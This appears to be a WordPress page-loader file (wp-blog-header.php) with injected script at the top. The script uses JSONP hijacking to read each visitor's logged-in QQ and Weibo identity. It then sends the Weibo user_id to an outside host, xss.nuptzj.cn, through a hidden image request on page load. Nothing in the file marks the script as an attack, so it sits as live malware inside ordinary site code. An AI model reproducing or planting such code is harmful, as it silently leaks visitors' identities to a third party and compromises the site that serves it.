<link rel="stylesheet" href="http://apps.bdimg.com/libs/alertify.js/0.3.11/alertify.core.css" />
<link rel="stylesheet" href="http://apps.bdimg.com/libs/alertify.js/0.3.11/alertify.default.css" />
<script type="text/javascript" src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.js"></script>
<script src="http://apps.bdimg.com/libs/alertify.js/0.3.11/alertify.min.js"></script>
<script>
 $(function() {
   $.ajax({
     url: 'http://coral.qq.com/user/0',
     jsonp: "callback",
     dataType: "jsonp",
     success: function(response) {
       if (response.errCode != 0)
         return;
 
       alertify.set({ delay: 10000 });
       alertify.log(response.data['nick'] + ",Hello!");
     }
   });
 });
</script>
<script>
 $(function() {
   $.ajax({
     url: 'http://game.weibo.com/home/indexv3/pajaxUserInfo',
     jsonp: "callback",
     dataType: "jsonp",
     success: function(response) {
       if (response.errorCode != 0)
         return;
         (new Image()).src="http://xss.nuptzj.cn/?id="+response.data['user_id'];
       alertify.set({ delay: 15000 });
       alertify.log(response.data['user_name'] + ",Hello!");
     }
   });
 });
</script>
<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( !isset($wp_did_header) ) {

	$wp_did_header = true;

	require_once( dirname(__FILE__) . '/wp-load.php' );

	wp();

	require_once( ABSPATH . WPINC . '/template-loader.php' );

}
